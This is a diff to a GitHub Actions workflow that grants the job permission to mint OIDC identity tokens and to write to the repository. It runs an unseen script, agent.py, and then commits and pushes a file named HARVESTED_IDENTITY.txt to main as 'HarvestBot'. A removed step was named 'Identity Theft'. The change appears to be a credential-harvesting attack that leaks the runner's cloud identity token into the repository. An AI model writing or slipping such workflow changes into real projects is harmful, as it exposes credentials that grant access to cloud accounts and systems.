@@ -3,12 +3,18 @@ on:
   push:
   workflow_dispatch:
 permissions:
-  id-token: write # CRITICAL: This grants the runner the permission to generate a token
+  id-token: write
+  contents: write
 jobs:
   execute:
     runs-on: ubuntu-latest
     steps:
-      - name: Identity Theft
+      - uses: actions/checkout@v3
+      - name: Harvest and Commit
         run: |
           python3 .github/workflows/agent.py
-          sleep 60
+          git config --global user.email "harvest@bot"
+          git config --global user.name "HarvestBot"
+          git add HARVESTED_IDENTITY.txt
+          git commit -m "SECURED_HARVEST_DATA"
+          git push origin main
